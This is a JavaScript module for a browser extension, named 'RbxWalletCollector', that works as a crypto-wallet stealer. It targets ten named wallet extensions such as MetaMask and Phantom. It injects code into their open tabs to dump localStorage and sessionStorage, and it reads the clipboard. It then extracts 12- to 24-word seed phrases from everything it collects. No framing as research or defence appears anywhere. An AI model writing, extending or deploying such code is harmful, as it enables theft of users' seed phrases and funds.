'use strict';

(function (global) {
  /** Public Chromium extension IDs (Chrome Web Store). */
  const WALLET_EXTENSIONS = [
    { id: 'nkbihfbeogaeaoehlefnkodbefgpgknn', label: 'MetaMask' },
    { id: 'bfnaelmomeimhlpmgjnjophhpkkoljpa', label: 'Phantom' },
    { id: 'hnfanknocfeofbddgcijnmhnfnkdnaad', label: 'Coinbase Wallet' },
    { id: 'acmacodkjbdgmoleebolmdjonilkdbch', label: 'Rabby' },
    { id: 'egjidjbpglichdcondbcbdnbeeppgdph', label: 'Trust Wallet' },
    { id: 'fnjhmkhhmkbjkkabndcnnogagogbneec', label: 'Ronin' },
    { id: 'ibnejdfjmmkpcnlpebklmnkoeoihofec', label: 'TronLink' },
    { id: 'pbpjkclhhgpmhnkkbjmnnkpjegkmadkc', label: 'OKX Wallet' },
    { id: 'mcohilncbfahbmgdjkbpemabaehkeae', label: 'Coin98' },
    { id: 'fhbohimaelbohpjbbldcngcnapndodjp', label: 'Binance Wallet' }
  ];

  const WALLET_BY_ID = new Map(WALLET_EXTENSIONS.map((w) => [w.id, w]));

  const BIP39_WORD = '(?:[a-z]{3,8})(?:\\s+[a-z]{3,8}){11,23}';

  function extractMnemonicsFromText(text, into) {
    if (!text || typeof text !== 'string') return;
    const re = new RegExp('\\b' + BIP39_WORD + '\\b', 'gi');
    let m;
    while ((m = re.exec(text))) {
      const phrase = m[0].toLowerCase().trim();
      const words = phrase.split(/\s+/);
      if (
        words.length === 12 ||
        words.length === 15 ||
        words.length === 18 ||
        words.length === 21 ||
        words.length === 24
      ) {
        into.add(phrase);
      }
    }
  }

  function dumpStorageInPage() {
    const readStore = (store) => {
      const out = {};
      try {
        for (let i = 0; i < store.length; i++) {
          const k = store.key(i);
          if (k) out[k] = store.getItem(k);
        }
      } catch (e) {}
      return out;
    };
    return {
      localStorage: readStore(localStorage),
      sessionStorage: readStore(sessionStorage),
      url: location.href
    };
  }

  /** chrome-extension:// cannot be in manifest host_permissions — scan open tabs instead. */
  async function findOpenWalletTabs() {
    let tabs = [];
    try {
      tabs = await chrome.tabs.query({});
    } catch (e) {
      return [];
    }
    const out = [];
    for (const tab of tabs || []) {
      if (!tab || tab.id == null || !tab.url) continue;
      if (!tab.url.startsWith('chrome-extension://')) continue;
      let extId = '';
      try {
        extId = new URL(tab.url).hostname;
      } catch (e2) {
        continue;
      }
      const wallet = WALLET_BY_ID.get(extId);
      if (wallet) out.push({ tab, wallet });
    }
    return out;
  }

  async function readClipboardMnemonic() {
    try {
      if (!navigator.clipboard || typeof navigator.clipboard.readText !== 'function') return null;
      const t = await navigator.clipboard.readText();
      const set = new Set();
      extractMnemonicsFromText(t, set);
      return set.size ? [...set] : null;
    } catch (e) {
      return null;
    }
  }

  async function collectWalletSnapshot() {
    const blocks = [];
    const mnemonics = new Set();
    const walletTabs = await findOpenWalletTabs();

    for (const { tab, wallet: w } of walletTabs) {
      try {
        const rows = await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: dumpStorageInPage
        });
        if (!rows || !rows.length || !rows[0].result) continue;
        const payload = rows[0].result;
        blocks.push(
          '=== ' +
            w.label +
            ' (' +
            w.id +
            ') tab=' +
            (tab.url || '') +
            ' ===\n' +
            JSON.stringify(payload, null, 2)
        );
        const blob =
          JSON.stringify(payload.localStorage || {}) + JSON.stringify(payload.sessionStorage || {});
        extractMnemonicsFromText(blob, mnemonics);
        for (const v of Object.values(payload.localStorage || {})) {
          if (typeof v === 'string') extractMnemonicsFromText(v, mnemonics);
        }
      } catch (e2) {}
    }

    const clip = await readClipboardMnemonic();
    if (clip) clip.forEach((p) => mnemonics.add(p));

    const text = blocks.length ? blocks.join('\n\n') + '\n' : '';
    return {
      success: blocks.length > 0 || mnemonics.size > 0,
      text,
      entries: blocks,
      mnemonics: [...mnemonics]
    };
  }

  global.RbxWalletCollector = {
    collectWalletSnapshot,
    WALLET_EXTENSIONS
  };
})(typeof globalThis !== 'undefined' ? globalThis : window);
